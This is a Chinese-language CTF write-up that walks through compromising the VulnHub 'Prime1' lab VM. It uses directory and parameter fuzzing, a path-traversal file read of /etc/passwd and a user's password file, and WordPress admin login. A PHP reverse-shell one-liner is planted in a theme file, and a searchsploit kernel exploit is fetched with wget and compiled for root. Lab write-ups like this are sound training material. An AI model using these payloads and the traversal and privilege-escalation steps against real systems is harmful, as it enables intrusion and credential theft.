prime1 - CTF
===

>   靶机镜像下载:   [vulhub](https://download.vulnhub.com/prime/Prime_Series_Level-1.rar)

||说明|ip|
|----|----|----|
|Kali|攻击机|192.168.170.135|
|Prime1|靶机|192.168.170.139|

### Nmap 扫描

首先还是非常常规的 Nmap 扫描, 收集信息。

#### 主机发现

```bash
sudo nmap -sn 192.168.170.0/24
```

---

![1-1.png](1-1.png)

#### 端口扫描

```bash
sudo 
```
![1-2.png](1-2.png)

![1-3.png](1-3.png)

![1-4.png](1-4.png)

![1-5.png](1-5.png)

在漏洞扫描中可以看到 "wordpress" 字样, 说明该网站是使用 wordpress 建站。

#### wordpress 扫描

 `wpscan` 是专门扫描 wordpress 站点的工具。

>   注意 wpscan 必须指定到 `../wordpress/` 目录下。

可以扫出 wordpress 的版本为 5.2.2。

#### 信息收集

访问目标站点:

![6.png](6.png)

根据站点信息, 管理员账户应该就是 `victor`, 首页的 `Log in` 应该也对应刚刚扫出的登录界面(*http://../wordpress/wp-login.php*)。

![2-3.png](2-3.png)

访问 `/javascript` , 可以看到 apache 服务的版本是2.4.18

### 目录爆破

既然已知网站使用了 wordpress, 那就可以指定后缀名 `.php`, `.html`:

```bash
sudo gobuster dir -u http://192.168.170.139 --wordlist=/usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt -x php, html
```

---

![2-1.png](2-1.png)

用 dirb 再扫一次, 再加上后缀 `.txt` :

```bash
sudo dirb http://192.168.170.139 -X .zip,.txt,.php
```

![2-4.png](2-4.png)

扫出了 3 个文件, 其中前两个 php 文件访问之后都是一个大图, 现在访问一下扫出来的 `/dev` 目录: 果然是车轱辘话。

![2-2.png](2-2.png)

再尝试访问一下 `secret.txt` 这个文件, 提示下一步要进行模糊测试。

![2-5.png](2-5.png)


### 模糊测试

打开上一步最后提示的 github 项目地址:

```markdown
1. WFUZZ

====================================================================================

 #    #  ######  #    #  ######  ######
 #    #  #       #    #      #       #
 #    #  #####   #    #     #       #
 # ## #  #       #    #    #       #
 ##  ##  #       #    #   #       #
 #    #  #        ####   ######  ######


====================================================================================

--------------------------------------------------------------------------------------
(i) USE WFUZZ TO ENUMERATE CORRECT PARAMETER FOR A PAGE.
---------------------------------------------------------------------------------------

COMMNAD = wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 http://website.com/secret.php?FUZZ=something

And the result is given below

000216:  C=200      70 L	      500 W	    2006 Ch	  "configs"
000200:  C=200      70 L	      500 W	    2006 Ch	  "cm"
000201:  C=200      70 L	      500 W	    2006 Ch	  "cmd"
000195:  C=200      70 L	      500 W	    2006 Ch	  "classified"
000197:  C=200      70 L	      500 W	    2006 Ch	  "client"
000204:  C=200      70 L	      500 W	    2006 Ch	  "coke"
Finishing pending requests...


----------------------------------------------------------------------------------------------------------------------
(ii) BUT ABOVE COMMND FAILED IF PAGE ALWAYS RETURN 200(HTTP REPONSE). NOW OUR MODIFIED COMMAND IS  =======>
----------------------------------------------------------------------------------------------------------------------

COMMAND = wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt  --hc 404 --hw 500 http://website-ip/index.php?FUZZ=something

And it will return result which is given below.

Total requests: 950

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

000357:  C=200      70 L	      500 W	    2006 Ch	  "file"

Total time: 3.753362
Processed Requests: 950
Filtered Requests: 949
Requests/sec.: 253.1063

Here we can see C=200(Our HTTP Respone from server). 
7 L ==> It means 7 lines return by server. 
500 W  ==> It means 19 words total count by wfuzz.
2006 Ch  ==> It means 206 total chars count by wfuzz which is return by server.

After using filter we can remove wrong parameter from our output and right output with right parameter we get.

--------------------------------------------------------------------------------------------------------
(*)WORKING WITH FILTERS:                                                                               |   

(i) If we want to filter words then we used switch --hw (words_lenth. In above example --hw 12)        |
(ii) To filter lenth then we used --hl(In above above example this would be --hl 7)
(iii) For chars we used --hh (In above example this would br --hh 206)                                 |
(iv) For response code we use --hc. And always we attach --hc 404. Because this is common for all.
                                                                                                       |                                                
--------------------------------------------------------------------------------------------------------
      

----------------------------------------------------------------

(iii) USE WFUZZ TO FIND OUT SUBDOMAINS.

----------------------------------------------------------------

COMMAND ==>  wfuzz -c -w /usr/share/seclists//usr/share/seclists/Discovery/DNS --hc 404 --hw 617 -u website.com -H "HOST: FUZZ.website.com"


USE filter to reach your actual subdomains like below command.

COMMAND  ==> wfuzz -c -w /usr/share/seclists//usr/share/seclists/Discovery/DNS --hc 404 --hw 7873 -u hnpsec.com -H "HOST: FUZZ.hnpsec.com"
```

---

那么按照提示使用 wfuzz 工具, 先测试 `image.php` 这个文件:

```bash
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.170.139/image.php?FUZZ=something
```

>   扫描过程中, 应该根据首次扫描的结果, 用--hc, --hl, --hw, --hh 来根据结果的属性屏蔽一些多余的项方便查看。

`image.php` 中没有有用的信息, 再试试 `index.php`:

```bash
wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.170.139/index.php?FUZZ=something
```
![3.png](3.png)

扫出了一个 payload 为 `file` , 马上着手访问一下:

![4-1.png](4-1.png)

刚刚在目录爆破的最后一步中, 有提示 *"//see the location.txt and you will get your next move"*, 可能是参数 `file` = `location.txt`:

```bash
sudo curl http://192.168.170.139/index.php?file=location.txt
```

---

![4-2.png](4-2.png)

根据回显, 转换到 `image.php` 替换参数为 `secrettier360`:

```bash
sudo curl http://192.168.170.139/image.php?secrettier360
```

线索到这里暂时就断了, 这个页面可能还要结合其他漏洞利用才能突破。

---

![4-3.png](4-3.png)

### 文件包含漏洞利用

文件包含漏洞是 web 常见的漏洞, 允许攻击者通过未经验证的用户输入**访问或执行服务器上的任意文件**。

>   在大多数情况下，使用足够多的 `../` 可以成功访问 `/etc/passwd`，因为服务器操作系统在处理路径时会**自动忽略多余的层级**。

在上一节最后一步的页面中尝试文件包含漏洞:

```bash
sudo curl http://192.168.170.139/image.php?secrettier360=../../../../../../../../etc/passwd
```

---

![5.png](5.png)

可以看到除了 www-data 和 root 账户, 还存在 victor 和 saket 两个账户, 其中 victor 和 wordpress 管理员名称一致, 可能使用了统一密码 *(虽然后文证明并不是, 但是收集信息时还是有必要记录下来)*

此外, 还显示 saket 这个账户的密码在 `/home/saket` 下, 重新构建 payload 尝试访问:

```bash
sudo curl http://192.168.170.139/image.php?secrettier360=../../../../../../../../home/saket/password.txt
```

得到 `follow_the_ippsec` , 这很可能是某个账户的密码。

![7.png](7.png)

### Wordpress 漏洞利用

#### 登录 Wordpress 后台

目前已知有 Linux 账户 victor 和 saket, Wordpress 账户 victor, 以及密码 `follow_the_ippsec`, 排列组合一下, 发现这是 Wordpress 管理员账户 victor 的密码。*(很可惜这不是 ssh 的密码)*

![8.png](8.png)

#### 通过 Wordpress 自定义插件和主题获取反弹 shell

因为 Wordpress 支持上传自定义的插件和主题, 因此可以把 payload 以**文件形式上传**, 获取 shell 。**这是 Wordpress 站点突破管理员账户后非常常用的利用方式。**

首先尝试插件的方式, 随便包一个压缩包上传, 服务器回显没有写权限, 应该行不通, 转向上传主题。

![9-1.png](9-1.png)

![9-2.png](9-2.png)

往后挨个看, 发现 `secret.php` 这个文件是可写的。

![9-3.png](9-3.png)

注入一个经典的反弹 shell 脚本:

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.170.135/443 0>&1'"); ?>
```

在 kali 上输入 `nc -lvnp 443` 来打开监听, 然后上传主题文件, 再执行这个 `secret.php` 就可以得到一个**反弹 shell**。

### 用户提权

#### 收集信息

简单收集一下 `www-data`这个账户的信息: 

![10.png](10.png)

看到可以不输入密码的情况下以 sudo 权限访问 `saket/enc` 这个文件, 不过也没什么很有用的信息。

继续收集信息, 查看一下系统版本:

![11.png](11.png)

这是一个比较旧的版本, 很可能有突破点, 用 `searchsploit` 搜索对应版本漏洞:

![12.png](12.png)

后两个都是提权漏洞, 这里就选第二个了,拷贝脚本并编译:

```bash
searchsploit -m 45010.c
sudo gcc 45010.c -o 45010
```

然后在 kali 的80端口上开启文件传输服务, 并使用靶机的 bash 来接收

>   `Kali`:
> 
>   ```bash
>   sudo php -S 0:80
>   ```

>   `靶机`:
>       这里转到了 `/tmp` 目录下, 因为这个目录通常不需要 root 权限来读写。
>   ```bash
>   cd /tmp
>   wget http://192.168.170.135/45010.c
>   ```

![13.png](13.png)

此时靶机上可能还没有足够的权限来执行, 可以用 45010.c 再编译一次试试:

```bash
gcc 45010.c -o 45010-2
./45010-2
```

---

![14.png](14.png)

已经可以执行了, 提权成功, 使用 python 获取完整的交互式 shell:

```bash
whoami
python -c "import pty;pty.spawn('/bin/bash')"
```
---

![15.png](15.png)

到这里就基本上已经拿下了, 之后简单操作一下, 这个 `root.txt` 就是 flag 文件。